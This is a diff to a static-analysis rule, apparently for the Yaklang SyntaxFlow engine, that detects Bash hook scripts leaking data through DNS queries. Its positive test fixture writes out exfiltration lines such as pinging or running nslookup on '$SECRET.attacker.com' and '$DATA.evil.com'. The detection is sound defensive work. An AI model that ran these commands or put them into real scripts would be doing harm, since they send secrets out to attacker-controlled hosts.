@@ -1,8 +1,8 @@
 desc(
-	mode: "source"
-	language: "general"
-	title: "源码匹配：检测到 Hooks 配置存在 DNS 外传"
-	title_zh: "检测到 Hooks 配置存在 DNS 外传",
+	mode: "ssa"
+	language: "bash"
+	title: "Bash：Hooks 脚本通过 DNS 查询外传数据"
+	title_zh: "Hooks 脚本通过 DNS 查询外传数据"
 	type: vuln
 	level: "middle"
 	rule_id: "source-config-hooks-dns-exfiltration-generic"
@@ -18,7 +18,8 @@ Hooks 中的 DNS 查询命令在主机名中使用了变量，可能通过 DNS �
 应用可能暴露内部路径、环境信息或敏感数据，攻击者可借此收集攻击面。
 
 ### 检测方式
-源码模式正则匹配，检测代码或配置中符合该风险模式的位置。
+Bash 语法解析：定位 `ping`、`nslookup`、`dig`、`host` 命令，检查其参数中是否包含
+未加引号的变量或命令替换。
 
 ### 参考
 - CWE-201
@@ -29,28 +30,26 @@ DNS 命令中仅使用静态主机名，不要用变量拼接域名。
 SOLUTION
 	alert_min: 1
 	"file://pos.sh": <<<POS
-#!/bin/bash
 ping -c 1 $SECRET.attacker.com
 nslookup $DATA.evil.com
 dig $EXFIL_DATA.example.com
 host ${EXFIL}.evil.com
 POS
 	"safefile://neg.sh": <<<NEG
-#!/bin/bash
 ping -c 1 google.com
 nslookup example.com
+dig example.com
+host example.com
 echo "  --analytics-host HOST           Analytics endpoint host (default: $ANALYTICS_HOST)"
-echo "host HOST           Analytics endpoint host (default: $"
-host
-    if [ -z "$EMPTY" ]; then
-      echo skip
-    fi
+if [ -z "$EMPTY" ]; then
+  echo skip
+fi
 NEG
 )
 
-${*.sh}.pattern_regex(/\b(ping|nslookup|dig|host)(?:[ \t]+-[a-zA-Z0-9]+(?:[ \t]+[0-9]+)?){0,5}[ \t]+\$\{?[A-Za-z_][A-Za-z0-9_]*/) as $p0
-${*.bash}.pattern_regex(/\b(ping|nslookup|dig|host)(?:[ \t]+-[a-zA-Z0-9]+(?:[ \t]+[0-9]+)?){0,5}[ \t]+\$\{?[A-Za-z_][A-Za-z0-9_]*/) as $p1
-$p0 + $p1 as $hit
+/^(ping|nslookup|dig|host)$/ as $dns
+$dns(* as $argv) as $call
+$call?{have: /@bash\.(param|cmd)-fields/} as $hit
 alert $hit for {
 	level: "middle",
 	title: "检测到 Hooks 配置存在 DNS 外传",
